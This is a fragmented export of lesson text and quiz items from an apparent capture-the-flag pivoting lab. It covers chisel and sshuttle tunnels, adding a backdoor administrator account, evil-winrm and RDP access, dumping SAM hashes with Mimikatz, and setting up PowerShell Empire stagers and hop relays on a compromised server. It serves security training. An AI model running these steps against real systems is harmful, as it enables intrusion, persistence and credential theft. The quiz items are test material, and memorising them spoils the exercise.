127.0.0.1:2222.</p><p><em><i><u><b><span style="font-size:18px">Local Port Forward:</span></b></u></i><br /></em>As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.</p><p>On the compromised target we set up a chisel server:<br /><code>./chisel server -p LISTEN_PORT</code><br /></p><p>We now connect to this from our attacking machine like so:<br /><code>./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT</code><br /></p><p>For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:<br /><code>./chisel client 172.16.0.5:8000 2222:172.16.0.10:22</code><br /></p><p><br /></p><hr /><p>As with the backgrounded socat processes, when we want to destroy our chisel connections we can use <code>jobs</code> to see a list of backgrounded jobs, then <code>kill %NUMBER</code> to destroy each of the chisel processes.</p><p><i><b>Note: </b>When using Chisel on Windows, it\'s important to remember to upload it with a file extension of </i><code>.exe</code><i> (e.g. </i><code>chisel.exe</code><i>)!</i><br /><em></em></p>', 'taskType': 'none', 'taskNo': 14, 'taskCreated': '2021-01-06T19:23:49.674Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>What command would you use to start a chisel server for a reverse connection on your attacking machine?</p><p>Use port 4242 for the listener and <b>do not</b> background the process.<br /></p>', 'hint': 'Assume that the copy of chisel is called "chisel" and is in your current directory.'}, {'questionNo': 2, 'question': '<p>What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?</p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337?

It doesn\'t perform a port forward, and the proxy it creates is nothing like the ones we have already seen. Instead it uses an SSH connection to create a tunnelled proxy that acts like a new interface. In short, it simulates a VPN, allowing us to route our traffic through the proxy <i>without the use of proxychains</i> (or an equivalent). We can just directly connect to devices in the target network as we would normally connect to networked devices. As it creates a tunnel through SSH (the secure shell), anything we send through the tunnel is also encrypted, which is a nice bonus. We use sshuttle entirely on our attacking machine, in much the same way we would SSH into a remote server. <br /></p><p>Whilst this sounds like an incredible upgrade, it is not without its drawbacks. For a start, sshuttle only works on Linux targets. It also requires access to the compromised server via SSH, and Python also needs to be installed on the server. That said, with SSH access, it could theoretically be possible to upload a static copy of Python and work with that. These restrictions do somewhat limit the uses for sshuttle; however, when it <i>is</i> an option, it tends to be a superb bet!</p><p>First of all we need to install sshuttle. On Kali this is as easy as using the <code>apt</code> package manager:<br /><code>sudo apt install sshuttle</code><br /></p><hr /><p>The base command for connecting to a server with sshuttle is as follows:<br /><code>sshuttle -r username@address subnet\xa0 </code><br /></p><p>For example, in our fictional 172.16.0.x network with a compromised server at 172.16.0.5, the command may look something like this:<br /><code>sshuttle -r user@172.16.0.5 172.16.0.0/24</code><br /></p><p>We would then be asked for the user\'s password, and the proxy would be established. The tool will then just sit passively in the background and <img style="width:200px;margin:30px;float:right" src="https://assets.tryhackme.com/additional/wreath-network/OWFkMzlhNjkw.png" class="note-float-right" />forward relevant traffic into the target network.<br /></p><p>Rather than specifying subnets, we could also use the <code>-N</code> option which attempts to determine them automatically based on the compromised server\'s own routing table:<br /><code>sshuttle -r username@address -N</code><br /></p><p>Bear in mind that this may not always be successful though!<br /></p><p>As with the previous tools, these commands could also be backgrounded by appending the ampersand (<code>&amp;</code>) symbol to the end.</p><p>If this has worked, you should see the following line:<br /><code>c : Connected to server.</code><br /></p><hr /><p>Well, that\'s great, but what happens if we don\'t have the user\'s password, or the server only accepts key-based authentication?</p><p>Unfortunately, sshuttle doesn\'t currently seem to have a shorthand for specifying a private key to authenticate to the server with. That said, we can easily bypass this limitation using the <code>--ssh-cmd</code> switch.</p><p>This switch allows us to specify what command gets executed by sshuttle when trying to authenticate with the compromised server. By default this is simply <code>ssh</code> with no arguments. With the <code>--ssh-cmd</code> switch, we can pick a different command to execute for authentication: say, <code>ssh -i keyfile</code>, for example!</p><p>So, when using key-based authentication, the final command looks something like this:<br /><code>sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET</code><br /></p><p>To use our example from before, the command would be:<br /><code>sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24</code><br /></p><hr /><p><b>Please Note:</b> When using sshuttle, you may encounter an error that looks like this:<br /><code>client: Connected.<br />client_loop: send disconnect: Broken pipe<br />client: fatal: server died with error code 255</code><br /></p><p>This can occur when the compromised machine you\'re connecting to is part of the subnet you\'re attempting to gain access to. For instance, if we were connecting to 172.16.0.5 and trying to forward 172.16.0.0/24, then we would be including the compromised server inside the newly forwarded subnet, thus disrupting the connection and causing the tool to die.</p><p>To get around this, we tell sshuttle to exclude the compromised server from the subnet range using the <code>-x</code> switch.</p><p>To use our earlier example:<br /><code>sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5</code><br /></p><p>This will allow sshuttle to create a connection without disrupting itself.<br /></p>', 'taskType': 'none', 'taskNo': 15, 'taskCreated': '2021-01-06T20:20:13.211Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?<br /></p>', 'hint': 'Use Double quotes, as in the task.'}, {'questionNo': 3, 'question': '<p>You are trying to use sshuttle to connect to 172.16.0.100.\xa0 You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.</p><p>What switch (and argument) could you use to fix this error?<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background:rgba(178,178,178,.3);color:rgba(255,255,255,0.85)">Pivoting</span> Conclusion', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/3DFvx6TDSxE" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>That was a long and theory-heavy section, so kudos for getting this far!</p><p>The big take away from this section is: there are <i>many</i> different ways to pivot through a network.

Before we do that though, let\'s consolidate our position a little.</p><p>From the enumeration we did on this target we know that ports 3389 and 5985 are open. This means that (using an account with the correct privileges) we should be able to obtain either a GUI through RDP (port 3389) or a stable CLI shell using WinRM (port 5985).</p><p>Specifically, we need a user account (as opposed to the service account which we\'re currently using), with the "Remote Desktop Users" group for RDP, or the "Remote Management Users" group for WinRM.

Choose a unique username here (your TryHackMe username would do), and obviously pick a password which you don\'t use <i>anywhere </i>else.</p><p>First we create the account itself:<br /><code>net user USERNAME PASSWORD /add</code><br /></p><p>Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:<br /><code>net localgroup Administrators USERNAME /add<br />net localgroup "Remote Management Users" USERNAME /add<br /></code></p><p><img style="width:608px" alt="Adding a new user" src="https://assets.tryhackme.com/additional/wreath-network/5b8e4ccaed23.png" /><br /></p><p>We can now use this account to get stable access to the box!<br /></p><p></p><hr /><p></p><p>As mentioned previously, we could use either RDP or WinRM for this.</p><p><i><b>Note: </b>Whilst the target is set up to allow multiple sessions over RDP, for the sake of other users attacking the network in conjunction with memory limitations on the target, it would be appreciated if you stuck to the CLI based WinRM for the most part. We will use RDP briefly in the next section of this task, but otherwise please use WinRM when moving forward in the network.<br /></i></p><p>Let\'s access the box over WinRM. For this we\'ll be using an awesome little tool called <a href="https://github.com/Hackplayers/evil-winrm" target="_blank">evil-winrm</a>.</p><p>This does not come installed by default on Kali, so use the following command to install it from the Ruby Gem package manager:<br /><code>sudo gem install evil-winrm</code></p><p>With evil-winrm installed, we can connect to the target with the syntax shown here:<br /><code>evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP </code></p><p><img style="width:1075px" alt="Authenticating with Evil-WinRM" src="https://assets.tryhackme.com/additional/wreath-network/28b967dedffa.png" /><br /><br /><i>If you used an SSH portforward rather than sshuttle to access the Git Server, you will need to set up a second tunnel here to access port 5985. In this case you may also need to specify the target port using the -P switch (e.g. -</i><code>i 127.0.0.1 -P 58950</code><i>).</i></p><p>Note that evil-winrm usually gives medium integrity shells for added administrator accounts. Even if your new account has Administrator permissions, you won\'t actually be able to perform administrative actions with it via winrm.<br /><i></i></p><hr /><p>Now let\'s look at connecting over RDP for a GUI environment. </p><p>There are many RDP clients available for Linux. One of the most versatile is "xfreerdp" -- this is what we will be using here. If not already installed, you can install xfreerdp with the command:<br /><code>sudo apt install freerdp2-x11</code></p><p>As mentioned, xfreerdp is an incredibly versatile tool with a vast number of options available. These range from routing audio and USB connections into the target, through to pass-the-hash attacks over RDP. The most basic syntax for connecting is as follows:<br /><code>xfreerdp /v:IP /u:USERNAME /p:PASSWORD</code></p><p>For example:<br /><code>xfreerdp /v:172.16.0.5 /u:user /p:\'password123!\'</code></p><p>Note that (as this is a command line tool), passwords containing special characters must be enclosed in quotes.<br /></p><p>When authentication has successfully taken place, a new window will open giving GUI access to the target.<br /><img style="width:1049px" alt="Demonstration of logging in over RDP" src="https://assets.tryhackme.com/additional/wreath-network/a40854512a5e.png" /></p><p>That said, we can do a <i>lot</i> more with xfreerdp. These switches are particularly useful:-</p><ul><li><code>/dynamic-resolution</code> -- allows us to resize the window, adjusting the resolution of the target in the process</li><li><code>/size:WIDTHxHEIGHT</code> -- sets a specific size for targets that don\'t resize automatically with <code>/dynamic-resolution</code></li><li><code>+clipboard</code> -- enables clipboard support</li><li><code>/drive:LOCAL_DIRECTORY,SHARE_NAME</code> -- creates a shared drive between the attacking machine and the target. This switch is insanely useful as it allows us to very easily use our toolkit on the remote target, and save any outputs back directly to our own hard drive. In essence, this means that we never actually have to create any files on the target. For example, to share the current directory in a share called <code>share</code>, you could use: <code>/drive:.,share</code>, with the period (<code>.</code>) referring to the current directory<br /></li></ul><p>When creating a shared drive, this can be accessed either from the command line as <code>\\\\tsclient\\</code>, or through File Explorer under "This PC":<br /><img style="width:636px" alt="Showing the share created by xfreerdp when specifying /drive" src="https://assets.tryhackme.com/additional/wreath-network/9cd2021f9d36.png" /></p><p>Note that the name of the share will change according to what you selected in the <code>/drive</code> switch.</p><p>A useful directory to share is the <code>/usr/share/windows-resources</code> directory on Kali. This shares most of the Windows tools stockpiled on Kali, including Mimikatz which we will be using next. This would make the full command:<br /><code>xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share</code><br /></p><hr /><p>With GUI access obtained and our Windows resources shared to the target, we can now very easily use Mimikatz to dump the local account password hashes for this target. Next we open up a <code>cmd.exe</code> or <code>PowerShell</code> window <i>as an administrator</i> (i.e. right click on the icon, then click "Run as administrator") in the GUI and enter the following command:<br /><code>\\\\tsclient\\share\\mimikatz\\x64\\mimikatz.exe</code><br /><img style="width:620px" alt="Accessing mimikatz via the RDP share" src="https://assets.tryhackme.com/additional/wreath-network/fcb90c0d6fc5.png" /></p><p><i><b>Note: </b>if you used a different share name, you would need to substitute this in. Equally, if the command errors out, you may need to install mimikatz on Kali with </i><code>sudo apt install mimikatz</code><i>.</i></p><p>With Mimikatz loaded, we next need to give ourselves the Debug privilege and elevate our integrity to SYSTEM level. This can be done with the following commands:<br /><code>privilege::debug<br />token::elevate</code><br /><img style="width:1075px" alt="Elevating privileges in mimikatz" src="https://assets.tryhackme.com/additional/wreath-network/ce71a0375943.png" /><br /></p><p>If we want we could log Mimikatz output with the <code>log</code> command. For example: <code>log c:\\windows\\temp\\mimikatz.log</code>, would save the Mimikatz output into the Windows Temp directory. This could also be saved directly into our Kali machine, but be aware that the remote destination must be writeable to the local user running the RDP session.<br /></p><p>We can now dump all of the SAM local password hashes using:<br /><code>lsadump::sam</code><br /></p><p>Near the top of the results you will see the Administrator\'s NTLM hash:<br /><img style="width:468px" alt="Dumping credentials with lsadump::sam" src="https://assets.tryhackme.com/additional/wreath-network/7e1e0a52e601.png" /><br /></p><p>Jackpot!<br /></p><p></p>', 'taskType': 'none', 'taskNo': 21, 'taskCreated': '2021-01-18T19:26:33.555Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Create an account on the target.

C2 Frameworks are used to consolidate an attacker\'s position within\n a network and simplify post-exploitation steps (privesc, AV \nevasion, pivoting, looting, covert network tactics, etc), as well as providing red teams with extensive collaboration features. There are many C2 Frameworks \navailable. The most famous (and expensive) is likely <a href="https://www.cobaltstrike.com/" target="_blank">Cobalt Strike</a>; however, there are many others, including the .NET based <a href="https://github.com/cobbr/Covenant" target="_blank">Covenant</a>, <a href="https://github.com/Ne0nd0g/merlin" target="_blank">Merlin</a>, <a href="https://github.com/bats3c/shad0w" target="_blank">Shadow</a>, <a href="https://github.com/nettitude/PoshC2" target="_blank">PoshC2</a>, and many others.

It provides a wide range of \nmodules to take initial access to a network of devices, and turn\n it into something <i>much</i> bigger. In this section we will be \nlooking at the principles of PS Empire, as well as how to use it (and \nits GUI interface: Starkiller) to improve our shell and perform \npost-exploitation techniques on the Git Server.</p><p align="left">The Empire project was originally abandoned in early 2019; however, it was soon picked up by a company called <a href="https://www.bc-security.org/" target="_blank">BC-Security</a>,\n who have maintained and improved it ever since. As such, there are \nactually two public versions of Empire -- the original (now very outdated), and the current BC-Security fork.

Ultimately it\'s up to you which you use; both will be covered in the tasks. Regardless, we need to install at least Empire. </p><p align="left">In ages past this was a much more complicated process involving the Git repo and setup scripts. These days it\'s easiest to just use the apt repositories:</p><p align="left"><code>sudo apt install powershell-empire starkiller</code><br /></p><p align="left">With both installed, we now need to start an Empire server. This should stay running in the background whenever we want to use either the Empire Client or Starkiller:<br /><code>sudo powershell-empire server</code><br /></p><p align="left">The server should now start:<br /><img alt="Formatted command line output of Empire server starting" style="width:821px" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/2a7488301af1.png" /></p><p align="left">It would be more common to have an Empire server running on a separate C2 server (usually hosted locally with cloud infrastructure linking back to receive inbound connections through). Multiple pentesters or red teamers would then be able to connect to a single central server.</p><p align="left">This is entirely overkill for our uses here -- instead we will just run both the server and the client application(s) on the single Kali instance.<br /></p><hr /><p align="left">With the server started, let\'s get the Empire CLI Client working.

If the Empire server was on a different machine then you would need to either change the connection information in the <code>/usr/share/powershell-empire/empire/client/config.yaml</code> file, or connect manually from the Empire CLI Client using <code>connect HOSTNAME --username=USERNAME --password=PASSWORD</code>.</p><hr />Starkiller is an Electron app which works by connecting to the REST API exposed by the Empire server<p></p><p align="left">With an Empire server running, we can start Starkiller by executing "<code>starkiller</code>" in a new terminal window:<br /><img style="width:1075px" alt="Initial connection to Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/57827141bfe4.png" /></p><p></p><p align="left">From here we need to sign into the REST API we deployed previously.

Many of these extra features (such as the messaging functionality) are tailored for teams attacking a target; we will not be covering these collaborative features in much detail, but you are encouraged to look at them for yourself!<br /></p><p align="left">There\n is a problem though. As established previously, our target (the Git \nServer) does not have the ability to connect directly to our attacking \nmachine. Due to how Empire handles pivoting, we will need to set up a \nspecial kind of listener, so before we do that, we will learn the \n"normal" process for setting up Empire and Starkiller using the already \ncompromised Webserver as a target. Once we have a handle on how Empire \noperates, we will switch focus to our primary target: the Git Server.<br /></p><p align="left">In\n each of the following tasks, we will cover the relative section in both\n the Empire CLI and the Starkiller GUI.

The default listener is the <code>HTTP</code> listener. This is what we will be using here, although there are many others available. It\'s worth noting that a single listener can be used more than once -- they do not die after their first usage.</p><hr align="left" /><p align="left">Let\'s start by setting up a listener in the Empire CLI Client.</p><p align="left">Having started the client, we are met with the following menu:<br /><img alt="Demonstration of connecting with the Empire CLI Client" style="width:712px" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ba333000239e.png" /></p><p align="left">To select a listener we would use the <code>uselistener</code> command. To see all available listeners, type <code>uselistener\xa0</code> (making sure to include the space at the end!) -- this should bring up a dropdown menu of available listeners:<br /><img alt="Dropdown showing the listeners available" style="width:336px" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ecc40f11478c.png" /><br /></p><p align="left"> When you\'ve picked a listener, type <code>uselistener LISTENER</code> and press enter to select it; alternatively, the up and down arrow keys can also be used to traverse the dropdown, with the chosen listener again being selected by pressing enter. Here we will be using the <code>http</code> listener (the most common kind), so we use <code>uselistener http</code>:<br /><img alt="Screenshot showing the options table for the selected listener" style="width:659px" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/e79c26064a34.png" /><br /></p><p align="left">This brings up a huge table of options for the listener. If we need to see an updated copy of this table (having set options, for example), we can access it again with the <code>options</code> command when in the context of the listener.</p><p align="left">The syntax for setting options is identical to the Metasploit module options syntax -- <code>set OPTION VALUE</code>. Once again, a dropdown will appear showing us the available options after we type <code>set\xa0 </code>.<br /></p><p align="left">Set a new name for the listener. This allows us to easily identify it later -- especially if we have several open. It is not essential, however, and can be left at the default <code>http</code> if preferred. <br /></p><p align="left">That said, some options <i>must</i> be set. At a bare minimum we must set the host (to our own IP address) and port:<br /><img alt="Demo of setting the options for name, host and port" style="width:421px" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/a5d0eb75224f.png" /><br /></p><p align="left">Bear in mind that option names are case sensitive in Empire. </p><p align="left">Many of the other options presented here are extremely useful, so it\'s well worth learning what they do and how they can be applied.<br /></p><p align="left">With the required options set, we can start the listener with: <code>execute</code>. We can then exit out of this menu using <code>back</code>, or exit to the main menu with <code>main</code>.<br /></p><p align="left">To view our active listeners we can type listeners then press enter:<br /><img style="width:712px" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/9e5c79b3eec7.png" /><br /></p><p align="left">When we want to stop a listener, we can use <code>kill LISTENER_NAME</code> to do so --\xa0 a dropdown menu with our active listeners will once again appear to assist.<br /></p><hr align="left" /><p align="left">We have a listener in the Empire CLI; now let\'s do the same thing in Starkiller!</p><p align="left">When we first launched Starkiller, we were placed automatically in the Listeners menu:<br /><img style="width:1075.53px" alt="The listeners menu of Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/d8d7fd792211.png" /><br /></p><p align="left">The process of creating a listener with the GUI is very intuitive. Click the "Create " button.</p><p align="left">In the menu that pops up, set the Type to <code>http</code>, the same as with the Empire Listener we created before. Several new options will appear:<br /><img style="width:525px" alt="Available options for listeners in Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/efec537b41f2.png" /></p><p align="left">Notice that these options are identical to those we saw earlier in the CLI version.</p><p align="left">Once again, set the Name, Host, and Port for the listener (make sure to use a different port from previously if you already have an Empire listener started!):<br /><img style="width:517px" alt="Setting the name, host, and port options for the Starkiller listener" src="https://assets.tryhackme.com/additional/wreath-network/4ac9e0c14358.png" /><br /></p><p align="left">With the options set, click "Submit" at the top of the page, then go back to the Listeners menu by clicking on "Listeners" at the top left of the page.

There are many options here, but the only thing we need do is set the listener to the name of the listener we created in the previous task, then tell Empire to <code>execute</code>, creating the stager in our <code>/tmp</code> directory:<br /><img style="width:954px" alt="Setting the listener to connect to, then executing the stager" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/3e295bf67fb9.png" /><br /></p><p align="left">We now need to get the stager to the target and executed, but that is a job for later on. In the meantime we can save the stager into a file on our own attacking machine then once again exit out of the stager menu with <code>back</code>.</p><hr align="left" /><p align="left">Not unexpectedly, the process for generating stagers with Starkiller is almost identical.<br /></p><p align="left">First we switch over to the Stagers menu on the left hand side of the interface:<br /><img style="width:499px" alt="Showing the stagers menu on the left hand side of the Starkiller interface" src="https://assets.tryhackme.com/additional/wreath-network/8a10ffe7d3be.png" /><br /></p><p align="left">From here we click "Create" and once again select <code>multi/bash</code>.<br /></p><p align="left">We select the Listener we created in the previous task, then click submit, leaving the other options at their default values:<br /><img style="width:100%" alt="Setting the Listener name, then executing the stager" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/15e298c934fb.png" /><br /></p><p align="left"> This brings us back to the stagers main menu where we are given the option to copy the stager to the clipboard by clicking on the "Actions" dropdown and selecting "Copy to Clipboard":<br /><img style="width:909px" alt="Highlighting the button allowing us to copy the stager to the clipboard" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/71a9dfe8dffa.png" /></p><p align="left">Once again we would now have to execute this on the target.<br /></p>', 'taskType': 'none', 'taskNo': 26, 'taskCreated': '2021-01-10T22:59:52.410Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p align="justify">Using your choice of Empire CLI or Starkiller, generate a <code>multi/bash</code> stager and save it as a file on your own disk.<br /></p>', 'hint': ''}, {'questionNo': 2, 'question': '<p align="left"><b>Bonus Question (Optional):</b> Read through the code in the script and see if you can decipher what it is doing.

We need to get the file to the target and executed.</p><p align="left">There are a variety of ways we could do this. The simplest would simply be to use your preferred CLI text editor to create a file on the target, copy and paste the script in, then execute it. If using this method, please do it in the /tmp directory and follow the <code>FILENAME-USERNAME.sh</code> naming convention. We could also use something called a <i><a href="https://tldp.org/LDP/abs/html/here-docs.html" target="_blank">here-document</a> </i>to execute the entire script without ever writing it to the disk. </p><p align="left">That said, this is overkill. If we read through the script we can see that it is in three main parts:<br /><img style="width:948px" alt="Isolating the shebang, payload, and cleanup aspects of the script via highlighting. Line 1 is the shebang, line 2 is the payload, lines 3 and 4 are the cleanup." src="https://assets.tryhackme.com/additional/wreath-network/bed26471fb22.png" /><br /></p><div align="left"><ul><li>In the green square we have the <i>shebang</i>.

This doesn\'t destroy the agent, however. If we did want to kill our agent, we would do it with <code>kill AGENT_NAME</code>:<br /><img style="width:374px" alt="Demonstrating how to exit and kill an agent using the back and kill commands" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/2c32ca6d0224.png" /></p><p align="left">We can also rename agents using the command: <code>rename AGENT_NAME NEW_AGENT_NAME</code>.<br /></p><hr align="left" /><p align="left">To interact with agents In Starkiller we go to the Agents tab on the left hand side of the screen:<br /><img style="width:264px" alt="Highlighting the agents menu in Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/f72d55e49b79.png" /><br /></p><p align="left">Here we will see that our agent has checked in!<br /><img style="width:100%" alt="Showing what an agent checking in looks like in the Starkiller GUI" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/52199197fe7a.png" /><br /></p><p align="left">To interact with an agent in Starkiller we can either click on its name, or click on the "pop out" button in the actions menu.<br /></p><p align="left">This results in a menu which gives us access to a variety of amazing features, including the ability to execute modules (more on these soon), execute commands in an interactive shell, browse the file system, and much more.

We use something called a Hop Listener.</p><p align="left">Hop Listeners create what looks like a regular listener in our list of listeners (like the http listener we used before); however, rather than opening a port to receive a connection, hop listeners create files to be copied across to the compromised "jump" server and served from there. These files contain instructions to connect back to a normal (usually HTTP) listener on our attacking machine. As such, the hop listener in the listeners menu can be thought of as more of a placeholder -- a reference to be used when generating stagers. </p><p align="left">If this doesn\'t make much sense just now, don\'t worry! Hopefully it will once we have worked through an example.</p><p align="left">The hop listener we will be working with is the most common kind: the <code>http_hop</code> listener.</p><div align="left">When created, this will create a set of <code>.php</code>\n files which must be uploaded to the jumpserver (our compromised \nwebserver) and served by a HTTP server. Under normal circumstances this \nwould be a trivial task as the compromised server already has a \nwebserver running; however, out of courtesy to anyone else attempting \nthe network, we will not be using the installed webserver.</div><hr align="left" /><p align="left">Let\'s first look at starting the listener in Empire CLI.</p><p align="left">Switch into the context of the listener using <code>uselistener http_hop</code> from the main Empire menu (you may need to use <code>back</code> a few times to get out of any agents, etc). There are a few options we\'re interested in here:<br /><img style="width:75%" alt="Highlighting the options needing set for the http_hop listener: RedirectListener, Host, and Port" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/8fff79486323.png" /><br /></p><p align="left">Specifically we need:-</p><div align="left"><ul><li>A <b>RedirectListener</b> -- this is a regular listener to forward any received agents to. Think of the hop listener as being something like a relay on the compromised server; we still need to catch it with something! You could use the listener you set up earlier for this, or create an entirely new HTTP listener using the same steps we used earlier. Make sure that this matches up with the name of an already active listener though!<br /></li><li>A <b>Host</b>  -- the IP of the compromised webserver (<code>.200</code>).</li><li>A <b>Port</b> --  this is the port which will be used for the webserver hosting our hop files. Pick a random port here (above 15000), but remember it!</li></ul></div><p align="left">When filled in, our options should look something like this:<br /><img style="width:75%" alt="Showing the full options for the hop_listener when set. Also executing the listener." src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/0a85d9e55345.png" /><br /></p><p align="left">As shown in the screenshot, we then once again use <code>execute</code> to start the listener.</p><p align="left">This will have written a variety of files into a new <code>http_hop</code> directory in <code>/tmp</code> of our attacking machine. We will need to replicate this file structure on our jump server (the compromised <code>.200</code> webserver) when we serve the files. Notice that these files (<code>news.php</code>, <code>admin/get.php</code>, and <code>login/process.php</code>) would not look out of place amongst genuine web application files -- and indeed could easily be discretely merged into an existing webapp. </p><hr align="left" /><p align="left">Let\'s look at setting up a <code>http_hop</code> listener in Starkiller.</p><p align="left">By this stage you should be fairly familiar with this process, so we will go through this quickly.</p><p align="left">Switch back to the Listeners menu in Starkiller using the menu at the left-hand side of the screen:<br /><img style="width:253px" alt="Showing the listeners menu in Starkiller again" src="https://assets.tryhackme.com/additional/wreath-network/fed6f29eee3a.png" /><br /></p><p align="left">Create a new listener and choose "http_hop" for the type.

For this we will use the <code>multi/launcher</code> stager. We already covered how to create stagers back in task 26, so you should be able to do this relatively unguided. The only option needing to be set here is the "Listener" option, which needs set to the name of the <code>http_hop</code> listener we created in the previous task:</p><p align="left"><b>Empire CLI:</b><br /><img style="width:746px" alt="Setting the Listener option for the http_hop listener in Empire CLI Client" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/948827be57c0.png" /></p><p align="left"><b>Starkiller:</b><br /><img style="width:75%" alt="Making a multi/launcher in Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/18461d0a00ec.png" /></p><p align="left">If using the Empire CLI, you will be presented with a payload to copy and paste into the target\'s command line:<br /><img style="width:956px" alt="Showing the payload generated by Empire CLI to be copied into the target command line" src="https://assets.tryhackme.com/additional/wreath-network/597e71846d80.png" /><br /></p><p align="left">If using Starkiller you can copy the payload to your clipboard by clicking on the copy button of the Actions menu for the stager in the main Stagers menu:<br /><img style="width:100%" alt="Showing the payload generated by Starkiller" src="https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/df9e3449f125.png" /><br /></p><p align="left">Whichever method you chose, save the provided command somewhere and <i>do not</i> execute it yet. We will need it once we have set up the hop files on the jumpserver.<br /></p><hr align="left" /><p align="left">Now let\'s get that jumpserver set up!</p><p align="left">First of all, in the /tmp directory of the compromised webserver, create and enter a directory called <code>hop-USERNAME</code>. e.g.:<br /><img style="width:396px" alt="Creating a directory called hop-USERNAME in the /tmp directory of the compromised webserver. e.g. mkdir /tmp/hop-USERNAME, cd /tmp/hop-USERNAME" src="https://assets.tryhackme.com/additional/wreath-network/d2ca11ee5470.png" /><br /></p><p align="left">Transfer the contents from the <code>/tmp/http_hop</code> (or whatever you called it) directory across to this directory on the target server. A good way to do this is by zipping up the contents of the directory (<code>cd /tmp/http_hop &amp;&amp; zip -r hop.zip *</code>), then transferring the zipfile across using one of the methods previously shown. For example, doing this with a Python HTTP server:<br /><img style="width:1075px" alt="Demonstrating transferring the zip file using a Python HTTP server, as well as how to zip the file up." src="https://assets.tryhackme.com/additional/wreath-network/b3fa83178a6e.png" /><br /></p><p align="left">We can then unzip the zipfile on the webserver (i.e. <code>unzip hop.zip</code>):<br /><img style="width:431px" alt="Demonstrating unzipping the file on the target" src="https://assets.tryhackme.com/additional/wreath-network/f5e072039e18.png" /><br /></p><p align="left"><i><b>Note: </b>the output of </i><code>ls</code><i> </i>must <i>match up with the screenshot -- i.e. there should be a </i><code>news.php</code><i> file in your current directory, with </i><code>admin/</code><i> and </i><code>login/</code><i> as subdirectories.</i><br /></p><p align="left">We now need to actually serve the files on the port we chose when generating the http_hop listener (task 28). Fortunately we already know that this server has PHP installed as it serves as the backend to the main website. This means that we can use the PHP development webserver to serve our files!

As mentioned way back in the Pivoting Enumeration task, Nmap won\'t work on Windows unless it\'s been properly installed on the target. Scanning through one proxy is bad, but at this point we\'d be scanning through <i>two</i> proxies, which would be unbearable. We could write a tool to do it for us, but let\'s leave that for the time being (there will be more than enough coding in the upcoming section as it is!). Instead, let\'s look closer to home and ask one burning question:</p><p align="left"><b>How do Empire Modules work?</b></p><p align="left">For the most part Empire modules are quite literally just scripts (usually in PowerShell) that are executed by the framework through an active agent.\xa0 In other words, these are just PowerShell scripts, and we have PowerShell access to the target.</p><p align="left">For the sake of learning, let\'s upload the Empire Port Scanning script and execute it manually on the target. </p><hr align="left" /><div align="left">In our current situation (on an isolated target, communicating through a jumpserver), under normal circumstances uploading tools manually would usually be something of a chore -- think relays and webservers. Fortunately evil-winrm gives us several easy options for transferring and including tools.</div><p align="left"></p><p align="left"><u><b><span style="font-size:18px">Upload/Download:</span></b></u><br />The first option available to us is the in-built Upload/Download feature built into the tool. From within evil-winrm we can use <code>upload LOCAL_FILEPATH REMOTE_FILEPATH</code> to upload files to the target. Conversely, we can use <code>download REMOTE_FILEPATH LOCAL_FILEPATH</code> to download files back from the target. These could come in handy if we, say, wanted to upload a tool to the target, save the results from running it to a log file, then download the log file back to our attacking machine for storage. In both instances if we miss out the destination filepath (e.g. the remote filepath on upload, or the local filepath on download), the tool will be uploaded into our current working directory.<br /></p><p align="left">For example:<br /><img 